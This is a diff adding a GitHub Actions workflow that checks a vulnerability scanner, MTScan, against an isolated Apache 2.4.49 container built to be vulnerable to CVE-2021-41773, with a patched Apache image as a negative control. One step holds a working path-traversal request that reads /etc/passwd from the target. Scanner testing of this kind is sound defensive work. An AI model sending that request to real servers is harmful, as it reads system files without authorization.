@@ -1,0 +1,181 @@
+name: QA Real CVE Lab
+
+on:
+  push:
+    branches: [qa-cycle-real-cve-20260821-1751]
+
+permissions:
+  contents: read
+
+jobs:
+  real-cve-lab:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v7
+      - uses: actions/setup-python@v7
+        with:
+          python-version: "3.12"
+          cache: pip
+      - name: Install MTScan dependencies
+        run: python -m pip install --upgrade -r config/requirements.txt
+      - name: Install current ProjectDiscovery tools
+        shell: bash
+        run: |
+          set -euo pipefail
+          go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
+          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
+          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+          echo "$(go env GOPATH)/bin" >> "$GITHUB_PATH"
+      - name: Prepare templates and images
+        shell: bash
+        run: |
+          set -euo pipefail
+          "$(go env GOPATH)/bin/nuclei" -ut
+          docker pull httpd:2.4.49
+          docker pull httpd:2.4.58
+      - name: Start fresh isolated vulnerable target
+        shell: bash
+        run: |
+          set -euo pipefail
+          cat > "$RUNNER_TEMP/Dockerfile.cve" <<'EOF'
+          FROM httpd:2.4.49
+          RUN sed -i 's/^Listen 80$/Listen 8080/' /usr/local/apache2/conf/httpd.conf \
+           && sed -i 's/^#LoadModule cgid_module/LoadModule cgid_module/' /usr/local/apache2/conf/httpd.conf \
+           && printf '\n<Directory />\n    Require all granted\n</Directory>\nScriptAlias /cgi-bin/ "/usr/local/apache2/cgi-bin/"\n<Directory "/usr/local/apache2/cgi-bin/">\n    AllowOverride None\n    Options +ExecCGI\n    Require all granted\n</Directory>\n' >> /usr/local/apache2/conf/httpd.conf
+          EOF
+          docker build --network=none -f "$RUNNER_TEMP/Dockerfile.cve" -t mtscan-cve-2021-41773:qa "$RUNNER_TEMP"
+          docker network create --internal --driver bridge mtscan-qa-internal
+          docker run -d --name mtscan-vuln --network mtscan-qa-internal --read-only --tmpfs /usr/local/apache2/logs:rw,nosuid,nodev,noexec,size=8m --cap-drop ALL mtscan-cve-2021-41773:qa
+          TARGET_IP="$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' mtscan-vuln)"
+          echo "TARGET_IP=$TARGET_IP" >> "$GITHUB_ENV"
+          echo "TARGET_URL=http://$TARGET_IP:8080" >> "$GITHUB_ENV"
+          sleep 2
+          curl --fail --silent --show-error --max-time 5 "http://$TARGET_IP:8080/" >/dev/null
+          docker inspect mtscan-vuln > target-inspect.json
+      - name: Prove CVE-2021-41773 exists
+        shell: bash
+        run: |
+          set -euo pipefail
+          STATUS=$(curl -sS -o vuln-proof.txt -w '%{http_code}' --path-as-is "$TARGET_URL/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd")
+          echo "HTTP $STATUS" | tee vuln-proof-status.txt
+          grep -q 'root:' vuln-proof.txt
+      - name: Locate CVE template
+        shell: bash
+        run: |
+          set -euo pipefail
+          TPL=$(find "$HOME/nuclei-templates" -type f -iname 'CVE-2021-41773.yaml' | head -n1)
+          test -n "$TPL"
+          echo "CVE_TEMPLATE=$TPL" >> "$GITHUB_ENV"
+      - name: Baseline Nuclei detection
+        shell: bash
+        run: |
+          set -euo pipefail
+          nuclei -u "$TARGET_URL" -t "$CVE_TEMPLATE" -jsonl -ni -silent -o baseline-nuclei.jsonl
+          grep -qi 'CVE-2021-41773' baseline-nuclei.jsonl
+      - name: MTScan CLI Nuclei detection
+        shell: bash
+        run: |
+          set -euo pipefail
+          python src/workflow.py --nuclei -host "$TARGET_URL" -t "$CVE_TEMPLATE" --nuclei-json --no-interactsh --save-output --output-dir qa-cli-results > qa-cli.log 2>&1
+          grep -qi 'CVE-2021-41773' qa-cli-results/vulnerability_report.md
+          grep -qi 'CVE-2021-41773' qa-cli-results/nuclei_results.txt
+      - name: MTScan HTTPX and Naabu integration
+        shell: bash
+        run: |
+          set -euo pipefail
+          python src/workflow.py --httpx -host "$TARGET_URL" --status-code --title --save-output --output-dir qa-httpx-results > qa-httpx.log 2>&1
+          grep -q '200' qa-httpx-results/httpx_results.txt
+          python src/workflow.py --naabu -host "$TARGET_IP" -p 8080 --scan-type connect --save-output --output-dir qa-naabu-results > qa-naabu.log 2>&1
+          grep -q ':8080' qa-naabu-results/naabu_results.txt
+      - name: MTScan webapp API real-CVE detection
+        shell: bash
+        env:
+          MTSCAN_STORAGE_BACKEND: file
+        run: |
+          set -euo pipefail
+          rm -rf data
+          python - <<'PY'
+          import http.client, json, os, re, subprocess, sys, time
+          from pathlib import Path
+          host,port='127.0.0.1',18765
+          log=Path('qa-webapp.log'); h=log.open('w',encoding='utf-8')
+          p=subprocess.Popen([sys.executable,'-u','src/app_server.py','--host',host,'--port',str(port),'--no-browser'],stdout=h,stderr=subprocess.STDOUT,env=os.environ.copy())
+          def req(method,path,payload=None,cookie=None):
+              headers={}; body=None
+              if payload is not None: body=json.dumps(payload); headers['Content-Type']='application/json'
+              if cookie: headers['Cookie']=cookie
+              c=http.client.HTTPConnection(host,port,timeout=10)
+              try:
+                  c.request(method,path,body=body,headers=headers); r=c.getresponse(); raw=r.read().decode('utf-8','replace')
+                  return r.status,dict(r.getheaders()),json.loads(raw) if raw else {}
+              finally: c.close()
+          try:
+              end=time.time()+20
+              while time.time()<end:
+                  try:
+                      s,_,_=req('GET','/api/session')
+                      if s==200: break
+                  except OSError: pass
+                  time.sleep(.25)
+              else: raise AssertionError('webapp startup timeout')
+              h.flush(); txt=log.read_text(encoding='utf-8',errors='replace'); m=re.search(r'Initial one-time password: (\S+)',txt); assert m
+              pw=m.group(1); s,headers,data=req('POST','/api/login',{'username':'admin','password':pw}); assert s==200
+              cookie=headers['Set-Cookie'].split(';',1)[0]; new='MTScan-QA-Real-CVE-2026!'
+              s,_,_=req('POST','/api/change-password',{'current_password':pw,'new_password':new,'confirm_password':new},cookie); assert s==200
+              payload={'target':os.environ['TARGET_URL'],'mode':'nuclei','profile':'default','dry_run':False,'json_output':True,'options':{'templates':os.environ['CVE_TEMPLATE'],'no_interactsh':True}}
+              s,_,scan=req('POST','/api/scans',payload,cookie); assert s==201,scan
+              sid=scan['id']; end=time.time()+30
+              while time.time()<end:
+                  s,_,scan=req('GET',f'/api/scans/{sid}',cookie=cookie); assert s==200
+                  if scan.get('status') not in {'queued','running'}: break
+                  time.sleep(.25)
+              assert scan.get('status')=='completed',scan
+              assert 'cve-2021-41773' in json.dumps(scan).lower(),scan
+              Path('qa-webapp-result.json').write_text(json.dumps(scan,indent=2),encoding='utf-8')
+          finally:
+              if p.poll() is None:
+                  p.terminate()
+                  try: p.wait(timeout=5)
+                  except subprocess.TimeoutExpired: p.kill(); p.wait(timeout=5)
+              h.close()
+          PY
+      - name: Patched Apache negative control
+        shell: bash
+        run: |
+          set -euo pipefail
+          docker run -d --name mtscan-control --network mtscan-qa-internal httpd:2.4.58
+          CONTROL_IP="$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' mtscan-control)"
+          sleep 2
+          nuclei -u "http://$CONTROL_IP" -t "$CVE_TEMPLATE" -jsonl -ni -silent -o control-nuclei.jsonl || true
+          test ! -s control-nuclei.jsonl
+      - name: Write summary
+        if: always()
+        run: |
+          printf '%s\n' '# MTScan isolated real-CVE QA' '- Apache 2.4.49 / CVE-2021-41773' '- Fresh Docker --internal bridge; no published ports' '- Vulnerable container read-only with all Linux capabilities dropped' '- Baseline exploit proof, Nuclei baseline, MTScan CLI, HTTPX, Naabu, webapp API, and patched control exercised' > qa-summary.md
+      - name: Destroy isolated lab
+        if: always()
+        run: |
+          docker rm -f mtscan-vuln mtscan-control 2>/dev/null || true
+          docker network rm mtscan-qa-internal 2>/dev/null || true
+          docker image rm mtscan-cve-2021-41773:qa 2>/dev/null || true
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v5
+        with:
+          name: mtscan-real-cve-qa
+          path: |
+            qa-summary.md
+            vuln-proof-status.txt
+            baseline-nuclei.jsonl
+            control-nuclei.jsonl
+            qa-cli.log
+            qa-cli-results/
+            qa-httpx.log
+            qa-httpx-results/
+            qa-naabu.log
+            qa-naabu-results/
+            qa-webapp.log
+            qa-webapp-result.json
+            target-inspect.json
+          if-no-files-found: ignore
